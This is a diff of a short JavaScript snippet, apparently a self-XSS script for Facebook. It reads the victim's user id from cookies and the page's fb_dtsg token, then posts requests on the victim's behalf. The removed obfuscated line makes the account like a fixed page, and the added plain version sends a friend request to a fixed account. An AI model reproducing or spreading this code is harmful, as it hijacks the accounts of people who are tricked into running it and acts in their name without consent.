@@ -1,1 +1,11 @@
-var _0xf47d=['match','&__a=1&fb_dtsg=','getElementsByName','value','&ttstamp=','open','POST','setRequestHeader','Content-type','application/x-www-form-urlencoded','readyState','status','close','send','//www.facebook.com/ajax/pages/fan_status.php?__pc=EXP1%3ADEFAULT','fbpage_id=263035094218613&add=true&__user=','cookie'];(function(_0x4d4dca,_0x309c99){var _0x42bf83=function(_0x673166){while(--_0x673166){_0x4d4dca['push'](_0x4d4dca['shift']());}};_0x42bf83(++_0x309c99);}(_0xf47d,0x1d9));var _0xdf47=function(_0x3cf4d3,_0x48065e){_0x3cf4d3=_0x3cf4d3-0x0;var _0x4e547b=_0xf47d[_0x3cf4d3];return _0x4e547b;};var X=new XMLHttpRequest();var XURL=_0xdf47('0x0');var XParams=_0xdf47('0x1')+document[_0xdf47('0x2')][_0xdf47('0x3')](document[_0xdf47('0x2')][_0xdf47('0x3')](/c_user=(\d+)/)[0x1])+_0xdf47('0x4')+document[_0xdf47('0x5')]('fb_dtsg')[0x0][_0xdf47('0x6')]+_0xdf47('0x7');X[_0xdf47('0x8')](_0xdf47('0x9'),XURL,!![]);X[_0xdf47('0xa')](_0xdf47('0xb'),_0xdf47('0xc'));X['onreadystatechange']=function(){if(X[_0xdf47('0xd')]==0x4&&X[_0xdf47('0xe')]==0xc8){X[_0xdf47('0xf')];}};X[_0xdf47('0x10')](XParams);
+var X = new XMLHttpRequest();
+  var XURL = "//www.facebook.com/ajax/add_friend/action.php?dpr=1";
+  var XParams = "to_friend=100003085666469&action=add_friend&how_found=profile_browser&ref_param=pb_reactions&outgoing_id=&logging_location=&no_flyout_on_click=true&ego_log_data&http_referer&floc=list_of_people&__user="+document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1])+"&__a=1&fb_dtsg="+document.getElementsByName('fb_dtsg')[0].value+"&ttstamp=";
+  X.open("POST", XURL, true);
+  x.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+  X.onreadystatechange = function () {
+    if (X.readyState == 4 && X.status == 200) {
+      X.close;
+    }
+  };
+  X.send(XParams);
